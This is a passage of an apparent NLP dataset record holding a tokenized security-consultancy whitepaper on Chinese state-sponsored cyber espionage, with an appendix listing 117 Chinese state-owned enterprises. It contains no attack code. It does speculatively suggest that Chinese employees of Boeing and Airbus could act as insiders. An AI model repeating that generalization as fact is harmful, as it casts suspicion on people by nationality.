"Boeing", "and"], ["Airbus", ",", "or", "by", "large", "aeroplane", "engine", "suppliers", "such", "as", "Rolls", "Royce", "."], ["We", "know", "therefore", "that", "there", "is", "intent", "to", "build", "a", "domestic", "airliner", "and", "that", "previously", "reengineering", "has", "been", "attempted", ".", "Technology", "transfer", "is", "ongoing", "at", "the", "moment", ",", "but", "how"], ["(hypothetically)", "could", "computer", "network", "exploitation", "attacks", "help", "China", "achieve", "its", "goal", "?"], ["It", "is", "hard", "to", "imagine", "that", "a", "project", "of", "that", "size", "would", "not", "be", "given", "some", "assistance", "by", "the"], ["government", ",", "given", "that", "there", "is", "national", "pride", "at", "stake", ".", "If", "intelligence", "or", "military", "resources"], ["could", "be", "directed", "against", "Boeing", "and", "Airbus", "networks", "there", "would", "be", "some", "very", "quick", "wins", "."], ["Not", "only", "could", "design", "documents", "and", "technical", "information", "be", "stolen", "en", "masse", "and"], ["without", "the", "need", "to", "actually", "deal", "with", "the", "company", ",", "but", "there", "could", "be", "some", "weak", "links", "in"], ["the", "supply", "chains", "of", "these", "companies", "which", "would", "help", "an", "attacker", "to", "penetrate", "their"], ["networks", "."], ["First", ",", "smaller", "suppliers", "would", "provide", "an", "easy", "target", "from", "where", "attacks", "could", "be", "launched"], ["directly", ",", "spoofing", "emails", "with", "Trojans", "to", "improve", "the", "chance", "of", "recipients", "opening", "them", "."], ["Second", ",", "both", "companies", "have", "facilities", "in", "China", ",", "presumably", "with", "network", "connectivity"], ["which", "may", "provide", "a", "direct", "route", "into", "the", "main", "network", ".", "There", "are", "also", "Chinese", "citizens"], ["working", "for", "the", "two", "target", "organisations", "who", "could", "be", "tasked", "to", "download", "something"], ["nefarious", "or", "plug", "in", "a", "USB", "drive", "to", "help", "their", "country", "."], ["http://english", ".", "comac.cc/"], ["http://www", ".", "uschamber.com/sites/default/files/reports/100728chinareport_0.pdf"], ["18", "http://www", ".", "apcoworldwide.com/"], ["19", "http://en", ".", "wikipedia.org/wiki/Comac_C919"], ["16"], ["17"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["19", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Finally", "all", "large", "organisations", "share", "large", "amounts", "of", "their", "data", "with", "third", "parties", "such", "as", "law"], ["firms", "and", "consultants;", "companies", "that", "may", "not", "protect", "their", "networks", "as", "effectively", "as", "the"], ["target", "company", ".", "These", "\u2018data", "aggregators\u2019", "can", "present", "a", "major", "vulnerability", "in", "the", "security"], ["of", "sensitive", "data", "."], ["The", "end", "goal", "of", "the", "project", "is", "to", "sell", "the", "aircraft", "worldwide", "and", "to", "undercut", "the", "established"], ["suppliers", ".", "COMAC", "could", "achieve", "this", "by", "using", "lines", "of", "credit", "at", "favourable", "rates", "from", "the"], ["Chinese", "banks", "that", "would", "help", "to", "make", "deals", "cheaper", "for", "airlines", "purchasing", "aircraft", ".", "But"], ["what", "really", "helps", "these", "companies", "undercut", "foreign", "rivals", "is", "that", "they", "have", "not", "needed", "to"], ["spend", "huge", "amounts", "of", "money", "on", "R&D", "to", "get", "the", "plane", "off", "the", "ground", "in", "the", "first", "place", "."], ["If", "designs", "for", "the", "body", "of", "the", "aircraft", "could", "be", "stolen", "along", "with", "aerodynamic", "information", "it"], ["would", "cut", "development", "time", "by", "years;", "and", "by", "billions", "of", "dollars", ".", "If", "stolen", "engine", "designs"], ["were", "also", "used", "that", "would", "cut", "costs", "further", "still", ".", "Even", "if", "the", "companies", "from", "whom", "this"], ["technology", "had", "been", "stolen", "were", "able", "to", "see", "that", "it", "had", "been", "stolen", ",", "they", "would", "only", "be"], ["able", "to", "take", "limited", "action", "in", "response;", "and", "to", "do", "so", "could", "put", "at", "risk", "their", "continued", "ability"], ["to", "operate", "or", "sell", "in", "China", "."], ["The", "list", "of", "SOEs", "in", "\u201cAppendix", "A\u201d", "is", "dominated", "by", "transport", "companies", "(rail", ",", "aerospace", "and"], ["shipping)", ",", "energy", "(petrochemical", ",", "nuclear", ",", "power", "generation/distribution", ",", "hydro)", ",", "telecoms"], ["(mobile", ",", "infrastructure)", ",", "manufacturing", ",", "extraction/metals", "(coal", ",", "iron", ",", "steel", ",", "minerals", ","], ["aluminium)", "and", "trading", "companies", ".", "If", "a", "company", "has", "been", "targeted", "by", "Chinese", "state"], ["sponsored", "cyber", "espionage", ",", "we", "believe", "that", "any", "information", "stolen", "probably", "ends", "up", "in"], ["one", "of", "these", "SOEs", ".", "While", "China", "is", "able", "to", "manipulate", "market", "conditions", "in", "various", "ways", "to"], ["help", "SOEs", "prosper", ",", "nothing", "would", "contribute", "more", "to", "their", "growth", "and", "success", "than", "a", "supply"], ["of", "inside", "information", "about", "the", "activities", "of", "their", "competitors", "and", "customers", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["20", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Conclusion"], ["This", "situation", "has", "not", "developed", "overnight", ".", "These", "attacks", "have", "been", "going", "on", "for", "years:"], ["many", "reports", "detail", "intrusions", "going", "back", "to", "2003", "and", "earlier", ".", "It", "is", "quite", "possible", "that", "the"], ["targets", "of", "early", "attacks", "were", "merely", "foreign", "governments", "and", "dissidents", "and", "that", "the", "range"], ["of", "targets", "only", "broadened", "with", "the", "opening", "of", "the", "Chinese", "economy", "and", "an", "increased"], ["demand", "for", "intelligence", "to", "support", "business", "growth", "and", "projects", "of", "national", "importance", "."], ["The", "more", "success", "the", "attackers", "had", ",", "the", "more", "that", "demand", "grew", ".", "While", "China", "continues", "to"], ["carry", "out", "cyber", "attacks", "on", "companies", "throughout", "the", "rest", "of", "the", "world", "and", "these", "attacks"], ["continue", "either", "unnoticed", "or", "unpunished", ",", "there", "is", "no", "incentive", "for", "China", "to", "stop", ".", "The", "more"], ["that", "stolen", "data", "is", "exploited", "for", "the", "benefit", "of", "companies", "and", "the", "government", ",", "the", "greater"], ["the", "incentive", "to", "continue", "with", "these", "operations", "."], ["Governments", "and", "large", "companies", "do", "not", "appear", "to", "be", "making", "much", "headway", "in", "solving"], ["this", "problem", ".", "For", "large", "corporations", "in", "the", "West", ",", "where", "there", "is", "a", "tendency", "to", "focus", "more", "on"], ["the", "short", "term", "and", "on", "personal", "achievement", "rather", "than", "the", "long", "term", "advancement", "of", "the"], ["state", ",", "the", "potential", "riches", "which", "trade", "with", "China", "offers", "are", "so", "large", "that", "turning", "a", "blind", "eye"], ["to", "data", "theft", "may", "seem", "a", "reasonable", "price", "to", "pay", ".", "Governments", "dare", "not", "risk", "isolation", "from"], ["China", "for", "economic", "and", "political", "reasons", ".", "Norway", "has", "recently", "been", "shut", "out", "of", "Chinese"], ["relations", "after", "awarding", "the", "Nobel", "Peace", "Prize", "to", "a", "jailed", "Chinese", "dissident", "Liu", "Xiaobo20", ".", "Its"], ["trade", "links", "with", "China", "are", "minimal", ",", "so", "it", "can", "afford", "to", "do", "this", ",", "but", "few", "other", "countries", "would"], ["feel", "able", "to", "do", "the", "same", ".", "A", "combination", "of", "this", "reluctance", "to", "act", ",", "chronic", "under-investment"], ["in", "IT", "and", "a", "lack", "of", "user", "education", "about", "how", "to", "spot", "the", "warning", "signs", "of", "a", "potential", "attack"], ["means", "companies", "and", "organisations", "are", "extremely", "vulnerable", "."], ["In", "order", "to", "start", "rectifying", "the", "problem", "there", "is", "a", "need", "in", "the", "first", "instance", "to", "understand", "the"], ["problem", ".", "There", "needs", "to", "be", "an", "acceptance", "that", "this", "problem", "is", "not", "going", "to", "go", "away", ",", "that"], ["this", "is", "a", "business", "risk", "not", "at", "IT", "issue", ".", "Doing", "business", "with", "China", "carries", "extra", "risk", "in", "terms", "of", "data"], ["security", "and", "traditional", "security", "products", "are", "unable", "to", "defend", "your", "data", "against", "this", "type"], ["of", "attack", ".", "Investigation", "of", "compromises", "needs", "to", "be", "thorough", "and", "conducted", "by", "people"], ["familiar", "with", "this", "problem", "and", "not", "simply", "the", "technical", "aspects", "of", "it", ".", "Above", "all", "sensitive", "data"], ["must", "be", "segregated", "\u2013", "it", "is", "not", "possible", "to", "defend", "everything", "."], ["The", "reason", "targeted", "attacks", "pose", "such", "a", "dangerous", "threat", "is", "that", "these", "are", "not", "viruses"], ["which", "simply", "spread", "and", "act", "according", "to", "a", "set", "of", "defined", "rules", "in", "the", "software", ".", "There", "are"], ["human", "beings", "directing", "these", "attacks", "in", "a", "much", "more", "active", "way", ".", "They", "have", "been", "given"], ["specific", "duties", "and", "will", "not", "stop", "what", "they", "are", "doing", "until", "someone", "tells", "them", "to", "do", "so", "."], ["If", "your", "data", "is", "of", "interest", "today", ",", "it", "will", "still", "be", "of", "interest", "tomorrow", ".", "If", "you", "have", "been", "attacked"], ["once", "and", "somehow", "managed", "to", "stop", "it", ",", "you", "have", "only", "stopped", "one", "instance", "of", "the", "attack", ","], ["not", "the", "attack", "as", "a", "whole", ".", "The", "malware", "used", "simply", "provides", "a", "foothold", "in", "the", "network", ",", "an"], ["initial", "point", "of", "access", "through", "which", "other", "tools", "can", "be", "uploaded", "to", "allow", "attackers", "access"], ["over", "the", "longer", "term", ",", "to", "navigate", "through", "the", "network", "until", "they", "find", "the", "data", "of", "interest", "to"], ["them", ".", "If", "one", "technique", "doesn\u2019t", "work", ",", "they", "will", "adapt", "their", "methods", "and", "raise", "their", "game"], ["until", "they", "have", "success", "."], ["It", "may", "be", "that", "one", "day", "western", "governments", "will", "decide", "that", "\u2018if", "you", "can\u2019t", "beat", "them", ",", "join"], ["them\u2019", "and", "develop", "similar", "capabilities", "to", "be", "used", "against", "foreign", "governments", "and"], ["20"], ["http://www", ".", "bbc.co.uk/news/world-asia-pacific-11505164"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["21", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["companies", ".", "We", "can", "only", "speculate", "as", "to", "how", "China", "might", "react", "to", "the", "large-scale"], ["targeting", "of", "its", "own", "companies", "and", "institutions", ".", "As", "for", "now", ",", "we", "have", "limited", "evidence", "of"], ["large", "companies", "failing", "as", "a", "direct", "result", "of", "the", "attacks", ",", "though", "there", "seems", "to", "be"], ["consensus", "that", "Chinese", "intrusions", "at", "least", "contributed", "to", "the", "downfall", "of", "one", "time", "telecoms"], ["giant", "Nortel21", ".", "We", "do", "not", "yet", "know", "how", "many", "others", "may", "follow", "."], ["http://www", ".", "cbc.ca/news/world/story/2012/02/15/nortel-hacking-shields-as-ithappens.html"], ["21"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["22", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["About", "Context"], ["Context", "Information", "Security", "is", "an", "independent", "security", "consultancy", "specialising", "in", "both"], ["technical", "security", "and", "information", "assurance", "services", "."], ["The", "company", "was", "founded", "in", "1998", ".", "Its", "client", "base", "has", "grown", "steadily", "over", "the", "years", ",", "thanks"], ["in", "large", "part", "to", "personal", "recommendations", "from", "existing", "clients", "who", "value", "us", "as", "business"], ["partners", ".", "We", "believe", "our", "success", "is", "based", "on", "the", "value", "our", "clients", "place", "on", "our", "productagnostic", ",", "holistic", "approach;", "the", "way", "we", "work", "closely", "with", "them", "to", "develop", "a", "tailored"], ["service;", "and", "to", "the", "independence", ",", "integrity", "and", "technical", "skills", "of", "our", "consultants", "."], ["Context", "are", "ideally", "placed", "to", "work", "with", "clients", "worldwide", "with", "offices", "in", "the", "UK", ",", "Australia"], ["and", "Germany", "."], ["The", "company\u2019s", "client", "base", "now", "includes", "some", "of", "the", "most", "prestigious", "blue", "chip", "companies"], ["in", "the", "world", ",", "as", "well", "as", "government", "organisations", "."], ["The", "best", "security", "experts", "need", "to", "bring", "a", "broad", "portfolio", "of", "skills", "to", "the", "job", ",", "so", "Context", "has"], ["always", "sought", "to", "recruit", "staff", "with", "extensive", "business", "experience", "as", "well", "as", "technical"], ["expertise", ".", "Our", "aim", "is", "to", "provide", "effective", "and", "practical", "solutions", ",", "advice", "and", "support:", "when"], ["we", "report", "back", "to", "clients", "we", "always", "communicate", "our", "findings", "and", "recommendations", "in"], ["plain", "terms", "at", "a", "business", "level", "as", "well", "as", "in", "the", "form", "of", "an", "in-depth", "technical", "report", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["23", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Appendix"], ["No", "."], ["Company", "Name"], ["Website"], ["1"], ["China", "National"], ["Nuclear"], ["Corporation"], ["http://www", ".", "cnnc.com.cn"], ["2"], ["China", "Nuclear"], ["Engineering", "Group"], ["Corporation"], ["http://www", ".", "cnecc.com"], ["3"], ["China", "Aerospace"], ["Science", "and"], ["Technology"], ["Corporation"], ["http://www", ".", "spacechina.com"], ["4"], ["China", "Aerospace"], ["Science", "and"], ["Industry"], ["Corporation"], ["http://www", ".", "casic.com.cn"], ["5"], ["Aviation", "Industry"], ["Corporation", "of"], ["China"], ["http://www", ".", "avic.com.cn"], ["6"], ["China", "State"], ["Shipbuilding"], ["Corporation"], ["http://www", ".", "cssc.net.cn"], ["7"], ["China", "Shipbuilding"], ["Industry"], ["Corporation"], ["http://www", ".", "csic.com.cn"], ["8"], ["China", "North"], ["Industries", "Group"], ["Corporation"], ["http://www", ".", "norincogroup.com.cn"], ["9"], ["China", "South"], ["Industries", "Group"], ["Corporation"], ["http://www", ".", "csgc.com.cn"], ["10"], ["China", "Electronics"], ["Technology", "Group"], ["Corporation"], ["http://www", ".", "cetc.com.cn"], ["11"], ["China", "National"], ["Petroleum"], ["Corporation"], ["http://www", ".", "cnpc.com.cn/cn"], ["12"], ["China"], ["Petrochemical"], ["Corporation"], ["http://www", ".", "sinopecgroup.c"], ["om"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["24", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["13"], ["China", "National"], ["Offshore", "Oil"], ["Corporation"], ["http://www", ".", "cnooc.com.cn"], ["14"], ["State", "Grid"], ["Corporation", "of"], ["China"], ["http://www", ".", "sgcc.com.cn"], ["15"], ["China", "Southern"], ["Power", "Grid", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "csg.cn"], ["16"], ["China", "Huaneng"], ["Group"], ["http://www", ".", "chng.com.cn"], ["17"], ["China", "Datang"], ["Corporation"], ["http://www", ".", "china-cdt.com"], ["18"], ["China", "Huadian"], ["Corporation"], ["http://www", ".", "chd.com.cn"], ["19"], ["China", "Guodian"], ["Corporation"], ["http://www", ".", "cgdc.com.cn"], ["20"], ["China", "Power"], ["Investment"], ["Corporation"], ["http://www", ".", "cpicorp.com.cn"], ["21"], ["China", "Three", "Gorges"], ["Corporation"], ["http://www", ".", "ctgpc.com.cn/"], ["22"], ["Shenhua", "Group"], ["Corporation", "Limited"], ["http://www", ".", "shenhuagroup.com.cn"], ["23"], ["China"], ["Telecommunication"], ["s", "Corporation"], ["http://www", ".", "chinatelecom.com.cn"], ["24"], ["China", "United"], ["Network"], ["Communications"], ["Group", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "chinaunicom.com.cn"], ["25"], ["China", "Mobile"], ["Communications"], ["Corporation"], ["http://www", ".", "10086.cn"], ["26"], ["China", "Electronics"], ["Corporation"], ["http://www", ".", "cec.com.cn"], ["27"], ["China", "FAW", "Group"], ["Corporation"], ["http://www", ".", "faw.com.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["25", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["28"], ["Dongfeng", "Motor"], ["Corporation"], ["http://www", ".", "dfmc.com.cn"], ["29"], ["China", "First", "Heavy"], ["Industries"], ["http://www", ".", "cfhi.com"], ["30"], ["China", "National"], ["Erzhong", "Group", "Co", "."], ["http://www", ".", "chinaerzhong.com"], ["31"], ["Harbin", "Electric"], ["Corporation"], ["http://www", ".", "hpec.com"], ["32"], ["Dongfang", "Electric"], ["Corporation"], ["http://www", ".", "dongfang.com"], ["33"], ["Anshan", "Iron", "and"], ["Steel", "Group"], ["Corporation"], ["http://www", ".", "ansteelgroup.com"], ["34"], ["Baosteel", "Group"], ["Corporation"], ["http://www", ".", "baosteel.com"], ["35"], ["Wuhan", "Iron", "and"], ["Steel", "(Group)"], ["Corporation"], ["http://www", ".", "wisco.com.cn"], ["36"], ["Aluminum"], ["Corporation", "of"], ["China"], ["http://www", ".", "chalco.com.cn"], ["37"], ["China", "Ocean"], ["Shipping", "(Group)"], ["Company"], ["http://www", ".", "cosco.com"], ["38"], ["China", "Shipping"], ["(Group)", "Company"], ["http://www", ".", "cnshipping.com"], ["39"], ["China", "National"], ["Aviation", "Holding"], ["Company"], ["http://www", ".", "airchinagroup.com"], ["40"], ["China", "Eastern", "Air"], ["Holding", "Company"], ["http://www", ".", "ceair.com"], ["41"], ["China", "Southern", "Air"], ["Holding", "Company"], ["http://www", ".", "csair.cn"], ["42"], ["Sinochem", "Group"], ["http://www", ".", "sinochem.com"], ["43"], ["COFCO", "Limited"], ["http://www", ".", "cofco.com"], ["44"], ["China", "Minmetals"], ["Corporation"], ["http://www", ".", "minmetals.com.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["26", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["45"], ["China", "General"], ["Technology"], ["(Group)", "Holding", ","], ["Limited"], ["http://www", ".", "genertec.com.cn"], ["46"], ["China", "State"], ["Construction"], ["Engineering"], ["Corporation"], ["http://www", ".", "cscec.com"], ["47"], ["China", "Grain"], ["Reserves"], ["Corporation"], ["http://www", ".", "sinograin.com.cn"], ["48"], ["State", "Development"], ["&", "Investment", "Corp", "."], ["http://www", ".", "sdic.com.cn"], ["49"], ["China", "Merchants"], ["Group"], ["http://www", ".", "cmhk.com"], ["50"], ["China", "Resources"], ["http://www", ".", "crc.com.hk"], ["51"], ["China", "National"], ["Travel", "Service", "(HK)"], ["Group", "Corporation"], ["[China", "Travel"], ["Service", "(Holdings)"], ["Hong", "Kong", "Limited]"], ["http://www", ".", "hkcts.com"], ["52"], ["State", "Nuclear"], ["Power", "Technology"], ["Corporation", "Ltd", "."], ["http://www", ".", "snptc.com.cn"], ["53"], ["Commercial"], ["Aircraft", "Corporation"], ["of", "China", ",", "Ltd", "."], ["http://www", ".", "comac.cc"], ["54"], ["China", "Energy"], ["Conservation", "and"], ["Environmental"], ["Protection", "Group"], ["http://www", ".", "cecic.com.cn"], ["55"], ["China", "International"], ["Engineering"], ["Consulting"], ["Corporation"], ["http://www", ".", "ciecc.com.cn"], ["56"], ["China", "Huafu", "Trade"], ["&", "Development"], ["Group", "Corp", "."], ["http://www", ".", "hfjt.com.cn"], ["57"], ["China", "Chengtong"], ["Holdings", "Group", "Ltd", "."], ["http://www", ".", "cctgroup.com.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["27", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["58"], ["China", "National"], ["Coal", "Group", "Corp", "."], ["http://www", ".", "chinacoal.com"], ["59"], ["China", "Coal"], ["Technology", "&"], ["Engineering", "Group"], ["Corp", "."], ["http://www", ".", "ccteg.cn"], ["60"], ["China", "National"], ["Machinery", "Industry"], ["Corporation"], ["http://www", ".", "sinomach.com.cn"], ["61"], ["China", "Academy", "of"], ["Machinery", "Science"], ["&", "Technology"], ["http://www", ".", "cam.com.cn"], ["62"], ["Sinosteel"], ["Corporation"], ["http://www", ".", "sinosteel.com"], ["63"], ["China", "Metallurgical"], ["Group", "Corporation"], ["http://www", ".", "mcc.com.cn"], ["64"], ["China", "Iron", "&", "Steel"], ["Research", "Institute"], ["Group"], ["http://www", ".", "cisri.com.cn"], ["65"], ["China", "National"], ["Chemical"], ["Corporation"], ["http://www", ".", "chemchina.com"], ["66"], ["China", "National"], ["Chemical"], ["Engineering", "Group"], ["Corporation"], ["http://www", ".", "cncec.cn"], ["67"], ["Sinolight"], ["Corporation"], ["http://www", ".", "sinolight.cn"], ["68"], ["China", "National", "Arts"], ["&", "Crafts", "(Group)"], ["Corporation"], ["http://www", ".", "cnacgc.com"], ["69"], ["China", "National", "Salt"], ["Industry"], ["Corporation"], ["http://www", ".", "chinasalt.com.cn"], ["70"], ["Huacheng"], ["Investment", "&"], ["Management", "Co", ".", ","], ["Ltd", "."], ["Unknown"], ["71"], ["China", "Hengtian"], ["Group", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "chtgc.com"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["28", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["72"], ["China", "National"], ["Materials", "Group"], ["Corporation", "Ltd", "."], ["http://www", ".", "sinoma.cn"], ["73"], ["China", "National"], ["Building", "Materials"], ["Group", "Corporation"], ["http://www", ".", "cnbm.com.cn"], ["74"], ["China", "Nonferrous"], ["Metal", "Mining"], ["(Group)", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "cnmc.com.cn"], ["75"], ["General", "Research"], ["Institute", "for"], ["Nonferrous", "Metals"], ["http://www", ".", "grinm.com"], ["76"], ["Beijing", "General"], ["Research", "Institute"], ["of", "Mining", "&"], ["Metallurgy"], ["http://www", ".", "bgrimm.com"], ["77"], ["China", "International"], ["Intellectech"], ["Corporation"], ["http://www", ".", "ciic.com.cn"], ["78"], ["China", "Academy", "of"], ["Building", "Research"], ["http://www", ".", "cabr.com.cn"], ["79"], ["China", "North"], ["Locomotive", "and"], ["Rolling", "Stock"], ["Industry", "(Group)"], ["Corporation"], ["http://www", ".", "chinacnr.com"], ["80"], ["China", "South"], ["Locomotive", "&"], ["Rolling", "Stock"], ["Corporation", "Limited"], ["http://www", ".", "csrgc.com.cn"], ["81"], ["China", "Railway"], ["Signal", "&"], ["Communication"], ["Corporation"], ["http://www", ".", "crsc.cn"], ["82"], ["China", "Railway"], ["Group", "Limited"], ["http://www", ".", "crecg.com"], ["83"], ["China", "Railway"], ["Construction"], ["Corporation", "Limited"], ["http://www", ".", "crcc.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["29", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["84"], ["China"], ["Communications"], ["Construction"], ["Company", "Limited"], ["http://www", ".", "ccgrp.com.cn"], ["85"], ["Potevio", "Company"], ["Limited"], ["http://www", ".", "potevio.com"], ["86"], ["China", "Academy", "of"], ["Telecommunication"], ["and", "Technology"], ["http://www", ".", "datanggroup.cn"], ["87"], ["China", "National"], ["Agricultural"], ["Development"], ["Group", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "cnadc.com.cn"], ["88"], ["Chinatex"], ["Corporation"], ["http://www", ".", "chinatex.com"], ["89"], ["Sinotrans", "&", "CSC"], ["Holdings", "Co", ".", ",", "Ltd", "."], ["http://www", ".", "sinotrans-csc.com"], ["90"], ["China", "National", "Silk"], ["Import", "&", "Export"], ["Corporation"], ["http://www", ".", "chinasilk.com"], ["91"], ["China", "Forestry"], ["Group", "Corporation"], ["http://www", ".", "cfgc.cn"], ["92"], ["China", "National"], ["Pharmaceutical"], ["Group", "Corporation"], ["http://www", ".", "sinopharm.com"], ["93"], ["CITS", "Group"], ["Corporation"], ["http://www", ".", "citsgroup.com.cn"], ["94"], ["China", "Poly", "Group"], ["Corporation"], ["http://www", ".", "citsgroup.com.cn"], ["95"], ["Zhuhai", "ZhenRong"], ["Company"], ["http://www", ".", "zhzrgs.com.cn"], ["96"], ["China", "Architecture"], ["Design", "&", "Research"], ["Group"], ["http://www", ".", "cadreg.com.cn"], ["97"], ["China", "Metallurgical"], ["Geology", "Bureau"], ["http://www", ".", "cmgb.com.cn"], ["98"], ["China", "National"], ["Administration", "of"], ["Coal", "Geology"], ["http://www", ".", "ccgc.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["30", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["99"], ["Xinxing", "Cathay"], ["International", "Group"], ["Co", ".", ",", "Ltd", "."], ["http://www", ".", "xxcig.com"], ["100"], ["China", "Travelsky"], ["Holding", "Company"], ["http://www", ".", "travelskyholding"], ["s", ".", "com"], ["101"], ["China", "National"], ["Aviation", "Fuel", "Group"], ["Corporation"], ["http://www", ".", "cnaf.com"], ["102"], ["China", "Aviation"], ["Supplies", "Holding"], ["Company"], ["http://www", ".", "casc.com.cn"], ["103"], ["Power", "Construction"], ["Corporation", "of"], ["China"], ["http://www", ".", "zhongguodianjian.com"], ["104"], ["China", "Energy"], ["Engineering", "Group"], ["Co", ".", ",", "Ltd"], ["http://www", ".", "ceec.net.cn"], ["105"], ["China", "National"], ["Gold", "Group"], ["Corporation"], ["http://www", ".", "chinagoldgroup.com"], ["106"], ["China", "National"], ["Cotton", "Reserves"], ["Corporation"], ["http://www", ".", "cncrc.com.cn"], ["107"], ["China", "Printing"], ["(Group)"], ["Corporation"], ["http://www", ".", "cpgc.cn"], ["108"], ["China", "Guangdong"], ["Nuclear", "Power"], ["Holding"], ["Corporation", "Ltd", "."], ["http://www", ".", "cgnpc.com.cn"], ["109"], ["China", "Hualu", "Group"], ["Co", ".", ",", "Ltd", "."], ["http://www", ".", "hualu.com.cn"], ["110"], ["Alcatel-Lucent"], ["Shanghai", "Bell", "Co", ".", ","], ["Ltd", "."], ["http://www", ".", "alcatelsbell.com.cn"], ["111"], ["IRICO", "Group"], ["Corporation"], ["http://www", ".", "ch.com.cn"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["31", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["No", "."], ["Company", "Name"], ["Website"], ["112"], ["Wuhan", "Research"], ["Institute", "of", "Post", "and"], ["Telecommunication"], ["s"], ["http://www", ".", "wri.com.cn"], ["113"], ["OCT", "Group"], ["http://www", ".", "chinaoct.com"], ["114"], ["Nam", "Kwong"], ["(Group)", "Company"], ["Limited"], ["http://www", ".", "namkwong.com"], ["", ".", "mo"], ["115"], ["China", "XD", "Group"], ["http://www", ".", "xd.com.cn"], ["116"], ["China", "Railway"], ["Materials"], ["Commercial", "Corp", "."], ["http://www", ".", "crmsc.com.cn"], ["117"], ["China", "Reform"], ["Holdings"], ["Corporation", "Ltd", "."], ["http://www", ".", "crhc.cn/n127514"], ["92/index", ".", "html"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["32", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Context", "Information", "Security", "Ltd"], ["London"], ["(HQ)"], ["Cheltenham"], ["D\u00fcsseldorf"], ["Melbourne"], ["4th", "Floor"], ["Corinth", "House"], ["Adersstr", ".", "28", ",", "1", ".", "OG"], ["Level", "9", ",", "440", "Collins", "St"], ["30", "Marsh", "Wall"], ["117", "Bath", "Road"], ["D-40215", "D\u00fcsseldorf"], ["Melbourne"], ["London", "E14", "9TP"], ["Cheltenham", "GL53", "7LS"], ["Germany"], ["Victoria", "3000"], ["United", "Kingdom"], ["United", "Kingdom"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["Australia"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["33", "/", "33"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Organization", "name": "CrowdStrike", "sent_id": 8, "pos": [5]}, {"old_id": "T2", 